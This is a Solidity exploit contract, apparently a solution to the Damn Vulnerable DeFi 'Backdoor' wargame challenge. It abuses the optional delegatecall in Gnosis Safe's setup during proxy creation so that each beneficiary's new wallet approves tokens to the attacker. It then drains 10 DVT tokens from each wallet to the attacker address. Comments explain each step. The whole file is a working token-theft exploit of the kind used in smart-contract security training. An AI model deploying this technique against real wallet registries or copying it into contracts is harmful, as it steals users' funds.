pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";


contract WalletRegistryExp {
    address private attacker;
    IProxyCreationCallback private walletReg;
    address private singleton;
    GnosisSafeProxyFactory private walletFactory;
    address[] private users;

    constructor(
        address _attacker,
        address _walletReg,
        address _walletFactory,
        address[] memory _users,
        address _singleton
        )
        {
        attacker = _attacker;
        walletReg = IProxyCreationCallback(_walletReg);
        singleton = _singleton;
        walletFactory = GnosisSafeProxyFactory(_walletFactory);

        for (uint i = 0; i < _users.length; i++) {
            users.push(_users[i]);
        }
    } 
    
    /*
     * Gnosis::createProxyWithCallback accepts an initializer and use it to call
     * a GnosisSafe function through GnosisProxy
     * WalletRegistry requires GnosisSafe::setup be called during initialization
     * However, setup function takes two optional parameters to make an arbitrary delegatecall
     * to an arbitrary contract address
     * We can use this feature to make GnosisSafe wallet delegatecall to a contract 
     * which we can make something for our benefit like approving the wallet's tokens.
     */
    function exploit(address _backdoor, address _dvtAddr) external {
        // repeat for every beneficiary users
        for (uint256 i = 0; i < users.length; i++) {
            // set the beneficiary as wallet owner
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // delegatecall to our backdoor contract backkdoor(dvtTokenAddress, exploitContractAddress)
            bytes memory delegateData = abi.encodeWithSignature("backdoor(address,address)", address(this), _dvtAddr);

            // create initializer to call setup with necessary parameters 
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                uint256(1),
                _backdoor,
                delegateData,
                address(0x0),
                address(0x0),
                uint256(0),
                payable(address(0x0)));

            /*
             * call GnosisSafeProxyFactory::createProxyWithCallback
             * it returns the created proxy's address
             */
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                singleton,
                initializer,
                123+i,
                walletReg 
            );

            /* 
             * our backdoor should have approved the tokens and WalletRegistry
             * should have sent them to the wallet.
             * basically transfer tokens to the attacker
             */ 
            DamnValuableToken dvt = DamnValuableToken(_dvtAddr);
            dvt.transferFrom(address(proxy), attacker, 10 ether); 
        }
    }
}